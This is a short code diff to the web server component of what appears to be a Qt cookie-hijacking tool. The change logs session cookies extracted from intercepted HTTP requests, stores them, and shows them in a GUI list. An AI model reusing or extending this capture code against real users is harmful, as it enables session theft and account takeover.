@@ -81,6 +81,7 @@ void WebServer::prepareSslServer(QSslServer* server) {
 	QObject::connect(server, &QSslServer::startedEncryptionHandshake, this, &WebServer::serverStartedEncryptionHandshake);
 }
 
+#include "chwidget.h"
 void WebServer::doReadyRead() {
 	qDebug() << "";
 	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
@@ -93,10 +94,15 @@ void WebServer::doReadyRead() {
 
 	QString host, cookie;
 	if (ch_->cookieHijack_.extract(httpRequest, host, cookie)) {
+		segments_[socket] = "";
+		qDebug() << "\n" << host << "\n" << cookie;
+
 		time_t created = QDateTime::currentDateTime().toSecsSinceEpoch();
 		ch_->cookieHijack_.insert(created, GMac::nullMac(), ip, host, cookie);
-		qDebug() << "\n" << host << "\n" << cookie;
-		segments_[socket] = "";
+
+		ChWidget* chWidget = dynamic_cast<ChWidget*>(ch_->parent());
+		Q_ASSERT(chWidget != nullptr);
+		chWidget->addItem(host, cookie);
 	}
 
 	if (httpRequest.startsWith("\u0016")) {
